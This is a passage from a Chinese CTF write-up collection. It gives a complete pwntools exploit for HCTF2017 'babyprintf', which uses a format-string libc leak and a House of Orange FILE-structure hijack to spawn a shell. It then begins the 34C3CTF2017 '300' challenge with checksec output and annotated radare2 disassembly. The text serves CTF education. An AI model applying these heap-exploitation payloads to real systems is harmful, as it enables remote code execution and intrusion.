exploit
完整 exp 如下：
#!/usr/bin/env python
from pwn import *
#context.log_level = 'debug'
io = process(['./babyprintf'], env={'LD_PRELOAD':'./libc-2.24.so'
})
libc = ELF('libc-2.24.so')
def prf(size, string):
io.sendlineafter("size: ", str(size))
io.sendlineafter("string: ", string)
def overwrite_top():
payload = "A" * 16
payload += p64(0) + p64(0xfe1) # top chunk head
1363
6.1.25 pwn HCTF2017 babyprintf
er
prf(0x10, payload)
def leak_libc():
global libc_base
prf(0x1000, '%p%p%p%p%p%pA') # _int_free in s
ysmalloc
libc_start_main = int(io.recvuntil("A", drop=True)[-12:], 16
) - 241
libc_base = libc_start_main - libc.symbols['__libc_start_mai
n']
log.info("libc_base address: 0x%x" % libc_base)
def house_of_orange():
io_list_all = libc_base + libc.symbols['_IO_list_all']
system_addr = libc_base + libc.symbols['system']
bin_sh_addr = libc_base + libc.search('/bin/sh\x00').next()
vtable_addr = libc_base + 0x3be4c0 # _IO_str_jumps
log.info("_IO_list_all address: 0x%x" % io_list_all)
log.info("system address: 0x%x" % system_addr)
log.info("/bin/sh address: 0x%x" % bin_sh_addr)
log.info("vtable address: 0x%x" % vtable_addr)
stream = p64(0) + p64(0x61) # fake header
# fp
stream += p64(0) + p64(io_list_all - 0x10) # fake bk pointer
stream += p64(0) # fp->_IO_write_
base
stream += p64(0xffffffff) # fp->_IO_write_
ptr
stream += p64(0) *2 # fp->_IO_write_
end, fp->_IO_buf_base
stream += p64((bin_sh_addr - 100) / 2) # fp->_IO_buf_end
stream = stream.ljust(0xc0, '\x00')
stream += p64(0) # fp->_mode
1364
6.1.25 pwn HCTF2017 babyprintf
payload = "A" * 0x10
payload += stream
payload += p64(0) * 2
payload += p64(vtable_addr) # _IO_FILE_plus-
>vtable
payload += p64(system_addr)
prf(0x10, payload)
def pwn():
io.sendline("0") # abort routine
io.interactive()
if __name__ == '__main__':
overwrite_top()
leak_libc()
house_of_orange()
pwn()
参考资料
https://github.com/spineee/hctf/tree/master/2017/babyprintf
1365
6.1.26 pwn 34C3CTF2017 300
6.1.26 pwn 34C3CTF2017 300
题目复现
题目解析
漏洞利用
参考资料
下载文件
题目复现
$ file 300
300: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dyn
amically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GN
U/Linux 2.6.32, BuildID[sha1]=5f43b102f0fe3f3dd770637f1d244384f6
b2a1c9, not stripped
$ checksec -f 300
RELRO STACK CANARY NX PIE
RPATH RUNPATH FORTIFY Fortified Fortifiable FILE
Full RELRO Canary found NX enabled PIE enabled
No RPATH No RUNPATH Yes 0 2 300
$ strings libc-2.24.so | grep "GNU C"
GNU C Library (Ubuntu GLIBC 2.24-9ubuntu2.2) stable release vers
ion 2.24, by Roland McGrath et al.
Compiled by GNU CC version 6.3.0 20170406.
64 位程序 ，开启了 canary、NX 和 PIE，默认开启 ASLR。
在 Ubuntu16.10 上玩一下：
) alloc
2) write
3) print
4) free
1  pdf @ main
/ (fcn) main 180
| main ();
| ; var int local_20h @ rbp-0x20
| ; var int local_14h @ rbp-0x14
| ; var int local_8h @ rbp-0x8
| ; var int local_4h @ rbp-0x4
| ; DATA XREF from 0x000007ad (entry0)
| 0x00000a91 push rbp
| 0x00000a92 mov rbp, rsp
| 0x00000a95 sub rsp, 0x20
| 0x00000a99 mov dword [local_14h], edi
| 0x00000a9c mov qword [local_20h], rsi
| ; CODE XREF from 0x00000b40 (main)
| .-> 0x00000aa0 mov eax, 0
| : 0x00000aa5 call sym.menu
| : 0x00000aaa mov eax, 0
| : 0x00000aaf call sym.read_int
; ssize_t read(int fildes, void *buf, size_t nbyte)
| : 0x00000ab4 mov dword [local_8h], eax
| : 0x00000ab7 lea rdi, str.slot___0_9
; 0xbfe ; "slot? (0-9)"
| : 0x00000abe call sym.myputs
| : 0x00000ac3 mov eax, 0
| : 0x00000ac8 call sym.read_int
; 读入 slot
1368
6.1.26 pwn 34C3CTF2017 300
| : 0x00000acd mov dword [local_4h], eax
; slot 放到 [local_4h]
| : 0x00000ad0 cmp dword [local_4h], 0
| ,== 0x00000adc mov edi, 0
| | : 0x00000ae1 call sym.imp.exit
; void exit(int status)
| | : ; CODE XREF from 0x00000ada (main)
| `---> 0x00000ae6 mov eax, dword [local_8h]
| : 0x00000ae9 cmp eax, 2
| ,== 0x00000afa cmp eax, 3
| ||,=== 0x00000b06 mov eax, dword [local_4h]
; 取出 slot
| ||| ||: 0x00000b09 mov edi, eax
| ||| ||: 0x00000b0b call sym.alloc_it
; 调用函数 alloc_it(slot)
| |||,==== 0x00000b12 mov eax, dword [local_4h]
; 取出 slot
| ||||| : 0x00000b15 mov edi, eax
| ||||| : 0x00000b17 call sym.write_it
; 调用函数 write_it(slot)
| |||||,== 0x00000b1e mov eax, dword [local_4h]
; 取出 slot
| |||| |: 0x00000b21 mov edi, eax
| |||| |: 0x00000b23 call sym.print_it
; 调用函数 print_it(slot)
| ||||,=== 0x00000b2a mov eax, dword [local_4h]
; 取出 slot
| | ||||: 0x00000b2d mov edi, eax
| | ||||: 0x00000b2f call sym.free_it
; 调用函数 free_it(slot)
| |,====== 0x00000b36 mov edi, 0
| | |||: 0x00000b3b call sym.imp.exit
; void exit(int status)
| | |||| ; CODE XREF from 0x00000b28 (main)
| | |||| ; CODE XREF from 0x00000b34 (main)
| | |||| ; CODE XREF from 0x00000b1c (main)
| | |||| ; CODE XREF from 0x00000b10 (main)
\ `-````= pdf @ sym.alloc_it
/ (fcn) sym.alloc_it 51
| sym.alloc_it ();
| ; var int local_4h @ rbp-0x4
| ; CALL XREF from 0x00000b0b (main)
| 0x000009ca push rbp
| 0x000009cb mov rbp, rsp
| 0x000009ce sub rsp, 0x10
| 0x000009d2 mov dword [local_4h], edi
; slot 放到 [local_4h]
| 0x000009d5 mov edi, 0x300
| 0x000009da call sym.imp.malloc
; rax = malloc(0x300) 分配堆空间
| 0x000009df mov rcx, rax
| 0x000009e2 mov eax, dword [local_4h]
| 0x000009e5 cdqe
| 0x000009e7 lea rdx, [rax*8]
; rdx = slot * 8
| 0x000009ef lea rax, obj.allocs
; 0x202040
| 0x000009f6 mov qword [rdx + rax], rcx
; 将该空间的地址放到 [0x202040 + slot * 8]
| 0x000009fa nop
| 0x000009fb leave
\ 0x000009fc ret
[0x00000790]> px 0x8*10 @ obj.allocs
- offset - 0 1 2 3 4 5 6 7 8 9 A B C D E F 0123456789A
BCDEF
0x00202040 0000 0000 0000 0000 0000 0000 0000 0000 ...........
.....
0x00202050 0000 0000 0000 0000 0000 0000 0000 0000 ...........
.....
0x00202060 0000 0000 0000 0000 0000 0000 0000 0000 ...........
.....
0x00202070 0000 0000 0000 0000 0000 0000 0000 0000 ...........
.....
0x00202080 0000 0000 0000 0000 0000 0000 0000 0000 ...........
.....
1371
6.1.26 pwn 34C3CTF2017 300